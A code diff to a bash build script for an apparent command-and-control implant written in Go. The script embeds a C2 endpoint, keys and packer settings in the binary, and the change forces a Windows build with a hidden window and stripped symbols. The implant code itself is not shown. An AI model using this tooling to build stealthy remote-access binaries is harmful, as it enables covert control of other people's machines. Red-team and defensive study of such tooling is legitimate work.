@@ -1,18 +1,17 @@
 #!/bin/bash
 set -e
 
-GOOS=$1
-GOARCH=$2
-C2=$3
-WAITSEC=$4
-CERT=$5
-KEY=$6
-AESKEY=$7 # rest are base32 encoded
-X1=$8 
-X2=$9
-UUID=${10}
-PACKER=${11}
-OUTFILE=${12}
+GOARCH=$1
+C2=$2
+WAITSEC=$3
+CERT=$4
+KEY=$5
+AESKEY=$6 # rest are base32 encoded
+X1=$7 
+X2=$8
+UUID=$9
+PACKER=${10}
+OUTFILE=${11}
 
 LDFLAGS=(
     "-X 'main.InitC2Endpoint=${C2}'"
@@ -24,12 +23,12 @@ LDFLAGS=(
     "-X 'main.X1=${X1}'"
     "-X 'main.X2=${X2}'"    
     "-X 'main.InitPFile=${PACKER}'"
+    "-H=windowsgui"
+    "-s"
+    "-w"
 )
 
 OLDDIR=$PWD
-if [ "${GOOS}" == "windows" ]; then
-    LDFLAGS+=("-H=windowsgui")
-fi
 
 if [ ! -z "$OUTFILE" ]; then
     LOCATION=$OUTFILE
@@ -37,7 +36,7 @@ if [ ! -z "$OUTFILE" ]; then
 fi
 
 cd $(dirname $0)
-GOOS=${GOOS} GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" ${OUTFILE}
+GOOS=windows GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" ${OUTFILE}
 
 
 if [ -z "$OUTFILE" ]; then
